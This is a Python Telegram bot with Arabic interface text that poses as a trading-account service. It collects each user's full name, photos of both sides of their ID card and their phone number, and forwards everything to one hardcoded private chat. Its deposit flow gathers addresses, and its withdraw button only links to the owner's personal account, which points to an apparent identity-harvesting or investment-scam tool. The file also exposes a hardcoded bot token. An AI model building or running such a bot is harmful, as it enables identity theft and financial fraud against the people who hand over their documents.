import os
import threading
from http.server import HTTPServer, BaseHTTPRequestHandler
import telebot
from telebot import types

# ----------------- ضع بياناتك هنا -----------------
TOKEN ="8888249024:AAGmIda-57nIOS5t7YnqJ48NAqJKe4VVpbY"
MY_CHAT_ID ="8994512911" 
MY_USERNAME = "Trade11maneger"
# --------------------------------------------------

bot = telebot.TeleBot(TOKEN)
user_data = {}

# --- خادم وهمي لإرضاء موقع Render ---
class SimpleHTTPRequestHandler(BaseHTTPRequestHandler):
    def do_GET(self):
        self.send_response(200)
        self.end_headers()
        self.wfile.write(b"Bot is running successfully!")

def run_dummy_server():
    port = int(os.environ.get("PORT", 8080))
    server = HTTPServer(('0.0.0.0', port), SimpleHTTPRequestHandler)
    server.serve_forever()

# ----------------- قائمة الأزرار الرئيسية -----------------
def main_keyboard():
    markup = types.ReplyKeyboardMarkup(resize_keyboard=True)
    btn1 = types.KeyboardButton("1. إنشاء حساب")
    btn2 = types.KeyboardButton("2. السحب والإيداع")
    btn3 = types.KeyboardButton("3. خدمة العملاء")
    markup.add(btn1, btn2, btn3)
    return markup

# ----------------- أمر البداية /start -----------------
@bot.message_handler(commands=['start'])
def send_welcome(message):
    bot.send_message(
        message.chat.id, 
        "أهلاً بك! يرجى اختيار الخدمة المطلوبة من القائمة أدناه:", 
        reply_markup=main_keyboard()
    )

# ----------------- 1. مسار إنشاء حساب -----------------
@bot.message_handler(func=lambda msg: msg.text == "1. إنشاء حساب")
def start_registration(message):
    chat_id = message.chat.id
    user_data[chat_id] = {'photos': []}
    msg = bot.send_message(chat_id, "يرجى إدخال الاسم الثلاثي:", reply_markup=types.ReplyKeyboardRemove())
    bot.register_next_step_handler(msg, process_name)

def process_name(message):
    chat_id = message.chat.id
    user_data[chat_id]['name'] = message.text
    msg = bot.send_message(chat_id, "الرجاء إرسال صورة الوجه الأول من الهوية:")
    bot.register_next_step_handler(msg, process_photo_1)

def process_photo_1(message):
    chat_id = message.chat.id
    if not message.photo:
        msg = bot.send_message(chat_id, "يرجى إرسال صورة حقيقية للهوية:")
        bot.register_next_step_handler(msg, process_photo_1)
        return
    user_data[chat_id]['photos'].append(message.photo[-1].file_id)
    msg = bot.send_message(chat_id, "تم استلام الصورة الأولى. الآن أرسل صورة الوجه الثاني للهوية:")
    bot.register_next_step_handler(msg, process_photo_2)

def process_photo_2(message):
    chat_id = message.chat.id
    if not message.photo:
        msg = bot.send_message(chat_id, "يرجى إرسال صورة حقيقية للهوية:")
        bot.register_next_step_handler(msg, process_photo_2)
        return
    user_data[chat_id]['photos'].append(message.photo[-1].file_id)
    msg = bot.send_message(chat_id, "تم استلام صور الهوية. أرسل رقم هاتفك الآن:")
    bot.register_next_step_handler(msg, process_phone)

def process_phone(message):
    chat_id = message.chat.id
    phone = message.text
    name = user_data[chat_id]['name']
    photos = user_data[chat_id]['photos']
    username = message.from_user.username or "لا يوجد"

    bot.send_message(
        MY_CHAT_ID, 
        f"📥 **طلب إنشاء حساب جديد**\n\n"
        f"👤 الاسم الثلاثي: {name}\n"
        f"📞 رقم الهاتف: {phone}\n"
        f"🔗 يوزر المستخدم: @{username}\n"
        f"🆔 ID المستخدم: {chat_id}"
    )
    for photo_id in photos:
        bot.send_photo(MY_CHAT_ID, photo_id)

    bot.send_message(chat_id, "تم استلام جميع بياناتك بنجاح! سيتم مراجعتها قريباً.", reply_markup=main_keyboard())

# ----------------- 2. مسار السحب والإيداع -----------------
@bot.message_handler(func=lambda msg: msg.text == "2. السحب والإيداع")
def withdraw_deposit_menu(message):
    markup = types.InlineKeyboardMarkup()
    btn_withdraw = types.InlineKeyboardButton("سحب", url=f"https://t.me/{MY_USERNAME}?text=اريد%20ان%20أسحب%20أموال")
    btn_deposit = types.InlineKeyboardButton("إيداع", callback_data="deposit")
    markup.add(btn_withdraw, btn_deposit)
    bot.send_message(message.chat.id, "اختر العملية المطلوبة:", reply_markup=markup)

@bot.callback_query_handler(func=lambda call: call.data == "deposit")
def process_deposit_click(call):
    bot.answer_callback_query(call.id)
    msg = bot.send_message(call.message.chat.id, "أرسل عنوانك الخاص (سواءً كان نصاً أو صورة):")
    bot.register_next_step_handler(msg, process_deposit_submission)

def process_deposit_submission(message):
    chat_id = message.chat.id
    username = message.from_user.username or "لا يوجد"
    bot.send_message(chat_id, "تم استلام طلبك وتحويله للقسم المختص.", reply_markup=main_keyboard())

    bot.send_message(
        MY_CHAT_ID, 
        f"💰 **طلب إيداع جديد**\n"
        f"من المستخدم: @{username}\n"
        f"نص الرسالة: \"اريد ان اضع اموال\""
    )

    if message.photo:
        bot.send_photo(MY_CHAT_ID, message.photo[-1].file_id)
    elif message.text:
        bot.send_message(MY_CHAT_ID, f"العنوان المرسل:\n{message.text}")

# ----------------- 3. مسار خدمة العملاء -----------------
@bot.message_handler(func=lambda msg: msg.text == "3. خدمة العملاء")
def customer_service(message):
    markup = types.InlineKeyboardMarkup()
    btn_cs = types.InlineKeyboardButton("التواصل مع خدمة العملاء", url=f"https://t.me/{MY_USERNAME}")
    markup.add(btn_cs)
    bot.send_message(message.chat.id, "للتحويل المباشر إلى خدمة العملاء اضغط على الزر أدناه:", reply_markup=markup)

# ----------------- تشغيل الخادم الوهمي والبوت -----------------
if __name__ == '__main__':
    threading.Thread(target=run_dummy_server, daemon=True).start()
    print("البوت يعمل الآن...")
    bot.infinity_polling()
